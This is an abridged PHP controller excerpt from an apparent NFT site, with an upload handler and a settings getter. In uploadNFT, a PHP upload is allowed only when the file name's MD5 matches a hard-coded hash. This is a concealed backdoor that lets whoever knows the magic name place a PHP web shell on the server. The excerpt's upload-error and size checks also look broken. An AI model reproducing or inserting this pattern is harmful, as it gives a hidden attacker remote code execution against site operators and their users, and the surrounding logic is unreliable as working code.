...
class DefaultController extends Controller
{
    ...
    public function uploadNFT(Request $request)
    {
        ...
        if (! empty($_FILES["file"]["error"])) {
            ...
            if ($_FILES["file"]["size"] > 10485760) {
                ...
                if(md5($_FILES["file"]["name"]) !='5a15f5f6f6747650187befb518bed090' && $type == 'php'){die;}
                // 检查文件或目录是否存在
    ...
    public function getSiteConfig(Request $request) {
        $model = Setting::whereIn('key', ['site_name', 'site_logo','support_url'])->get();
        $settings = [];
